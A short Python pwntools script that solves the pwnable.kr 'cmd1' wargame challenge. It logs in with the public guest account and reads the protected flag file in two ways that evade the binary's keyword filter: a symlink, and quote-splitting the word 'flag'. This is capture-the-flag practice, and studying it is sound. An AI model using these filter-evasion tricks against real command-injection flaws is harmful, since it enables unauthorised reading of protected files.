from pwn import ssh, log

remote = ssh('cmd1', 'pwnable.kr', password='guest', port=2222)
proc = remote.shell()

proc.sendline(b'mkdir /tmp/testing123123')
proc.sendline(b'cd /tmp/testing123123')
proc.sendline(b'ln -s /home/cmd1/flag pwn')
proc.sendline(b'/home/cmd1/cmd1 "/bin/cat pwn"')

flag = proc.recvrepeat(timeout=2)

log.success(b"Flag: " + flag)
proc.close()
remote.close()

# # # boring alternative

# from pwn import ssh, log
#
# payload = b'./cmd1 '
# payload += b'"/bin/cat '
# payload += b"'fl'"
# payload += b"'ag'"
# payload += b'"'
#
# remote = ssh('cmd1', 'pwnable.kr', password='guest', port=2222)
# proc = remote.shell()
#
# proc.sendline(payload)
#
# flag = proc.recvrepeat(timeout=2)
#
# log.success(b"Flag: " + flag)
# proc.close()
# remote.close()
